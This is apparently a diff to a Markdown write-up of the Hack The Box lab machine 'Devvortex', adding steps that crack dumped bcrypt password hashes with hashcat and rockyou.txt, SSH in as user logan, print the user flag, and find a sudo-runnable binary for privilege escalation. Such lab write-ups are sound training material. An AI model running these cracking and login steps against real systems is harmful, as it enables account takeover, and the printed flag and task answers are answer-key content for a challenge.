@@ -1,4 +1,4 @@
-## Task 1 : How many open TCP ports are listening on Devvortex?
+<img width="284" height="123" alt="image" src="https://github.com/user-attachments/assets/05c3289b-e1c5-4942-b182-6d6fc5a2c216" />## Task 1 : How many open TCP ports are listening on Devvortex?
 
 Run an nmap scan on the target
 
@@ -310,6 +310,67 @@ select * from sd4fg_users
 <br>
 <br>
 We receive password hashes for Lewis and Logan.
+<br>
+
+```
+hashid '[hash]'
+```
+<br>
+<img width="596" height="105" alt="image" src="https://github.com/user-attachments/assets/408042d7-2067-474c-babd-761bbeac33aa" />
+<br>
+<br>
+To identify the type of hash.
+
+I'm guessing it is bcrypt.
+
+Based on [hashcat wiki](https://hashcat.net/wiki/doku.php?id=example_hashes), bcrypt's code is 3200.
+
+```
+echo '[hash]' > hash
+```
+
+```
+sudo hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
+```
+<img width="1205" height="1093" alt="image" src="https://github.com/user-attachments/assets/00762f5e-a669-48df-b217-4897a806ae91" />
+<br>
+<br>
+
+SSH into Logan's account using his newfound password
+
+```
+ssh logan@[target_IP]
+```
+
+<img width="592" height="499" alt="image" src="https://github.com/user-attachments/assets/2f156f73-84a9-438c-9176-bf7f5556287a" />
+<br>
+<br>
+
+```
+cat user.txt
+```
+<img width="284" height="123" alt="image" src="https://github.com/user-attachments/assets/ee708704-cfec-4290-9cbc-19d320c6520f" />
+<br>
+<br>
+
+> User Flag : 02840db970aeb6c2cc5447b53fec0310
+
+---
+
+## Task 8 : What is the full path to the binary that the logan user can run with root privileges using sudo?
+
+Run this command to see the sudo commands that Logan is allowed to run.
+<br>
+```
+sudo -l
+```
+<img width="951" height="144" alt="image" src="https://github.com/user-attachments/assets/d7cde61d-f3c5-4de2-ac63-f2b9385b38de" />
+<br>
+<br>
+
+> Answer : /usr/bin/apport-cli
+
+---
 
 
 
